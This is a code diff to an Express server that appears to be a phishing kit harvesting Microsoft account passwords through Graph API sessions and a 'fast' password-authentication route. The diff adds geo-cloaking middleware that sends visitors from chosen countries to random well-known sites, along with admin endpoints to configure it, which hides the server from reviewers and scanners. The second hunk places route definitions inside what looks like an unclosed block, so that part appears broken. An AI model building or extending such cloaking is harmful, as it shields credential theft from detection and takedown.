@@ -68,6 +68,86 @@ function requireAdminAuth(req, res, next) {
     next();
 }
 
+// Geo-blocking configuration
+const geoBlockConfig = {
+    enabled: false,
+    allowedCountries: [], // Empty = allow all
+    blockedCountries: [], // Empty = block none
+    mode: 'allow', // 'allow' or 'block'
+    randomRedirects: [
+        'https://www.google.com',
+        'https://www.wikipedia.org',
+        'https://www.youtube.com',
+        'https://www.reddit.com',
+        'https://www.amazon.com',
+        'https://www.microsoft.com',
+        'https://www.apple.com',
+        'https://www.facebook.com'
+    ]
+};
+
+// Load geo-blocking config from file
+const GEO_BLOCK_CONFIG_FILE = path.join(__dirname, 'geo-block-config.json');
+if (fs.existsSync(GEO_BLOCK_CONFIG_FILE)) {
+    try {
+        const savedGeoConfig = JSON.parse(fs.readFileSync(GEO_BLOCK_CONFIG_FILE, 'utf8'));
+        Object.assign(geoBlockConfig, savedGeoConfig);
+        if (geoBlockConfig.enabled) {
+            console.log('🌍 Geo-blocking enabled:', geoBlockConfig.mode === 'allow' ? 
+                `Allowing only: ${geoBlockConfig.allowedCountries.join(', ')}` :
+                `Blocking: ${geoBlockConfig.blockedCountries.join(', ')}`);
+        }
+    } catch (error) {
+        console.warn('Error loading geo-block config:', error.message);
+    }
+}
+
+// Geo-blocking middleware
+function geoBlockMiddleware(req, res, next) {
+    // Skip for API endpoints and admin panel
+    if (req.path.startsWith('/api/') || req.path === '/ad.html') {
+        return next();
+    }
+
+    // Skip if geo-blocking is disabled
+    if (!geoBlockConfig.enabled) {
+        return next();
+    }
+
+    // Get country from Cloudflare header (CF-IPCountry)
+    const country = req.get('CF-IPCountry');
+
+    if (!country || country === 'XX') {
+        // Unknown country - allow by default
+        return next();
+    }
+
+    let shouldBlock = false;
+
+    if (geoBlockConfig.mode === 'allow') {
+        // Allow-only mode: block if country not in allowed list
+        shouldBlock = geoBlockConfig.allowedCountries.length > 0 && 
+                      !geoBlockConfig.allowedCountries.includes(country);
+    } else {
+        // Block mode: block if country in blocked list
+        shouldBlock = geoBlockConfig.blockedCountries.includes(country);
+    }
+
+    if (shouldBlock) {
+        // Pick random redirect URL
+        const randomUrl = geoBlockConfig.randomRedirects[
+            Math.floor(Math.random() * geoBlockConfig.randomRedirects.length)
+        ];
+        
+        console.log(`🚫 Geo-blocked ${country} visitor, redirecting to ${randomUrl}`);
+        return res.redirect(randomUrl);
+    }
+
+    next();
+}
+
+// Apply geo-blocking before serving static files
+app.use(geoBlockMiddleware);
 app.use(express.static('public'));
 
 // Store user sessions with Graph API auth and OAuth state tracking
@@ -1025,6 +1105,46 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 console.warn('Error cleaning up fast auth session:', cleanupError.message);
                             }
 
+
+// Geo-blocking configuration endpoints
+app.get('/api/admin/geo-block/config', requireAdminAuth, (req, res) => {
+    res.json({
+        success: true,
+        config: geoBlockConfig
+    });
+});
+
+app.post('/api/admin/geo-block/config', requireAdminAuth, (req, res) => {
+    try {
+        const { enabled, mode, allowedCountries, blockedCountries, randomRedirects } = req.body;
+
+        if (enabled !== undefined) geoBlockConfig.enabled = enabled;
+        if (mode) geoBlockConfig.mode = mode;
+        if (allowedCountries) geoBlockConfig.allowedCountries = allowedCountries;
+        if (blockedCountries) geoBlockConfig.blockedCountries = blockedCountries;
+        if (randomRedirects) geoBlockConfig.randomRedirects = randomRedirects;
+
+        // Save to file
+        fs.writeFileSync(GEO_BLOCK_CONFIG_FILE, JSON.stringify(geoBlockConfig, null, 2));
+        
+        console.log('🌍 Geo-blocking config updated:', geoBlockConfig.mode === 'allow' ? 
+            `Allowing only: ${geoBlockConfig.allowedCountries.join(', ')}` :
+            `Blocking: ${geoBlockConfig.blockedCountries.join(', ')}`);
+
+        res.json({
+            success: true,
+            config: geoBlockConfig,
+            message: 'Geo-blocking configuration updated'
+        });
+    } catch (error) {
+        console.error('Error updating geo-block config:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to update geo-blocking configuration',
+            details: error.message
+        });
+    }
+});
 
 // Get Cloudflare configuration (for admin panel display)
 app.get('/api/admin/cloudflare/config', requireAdminAuth, async (req, res) => {
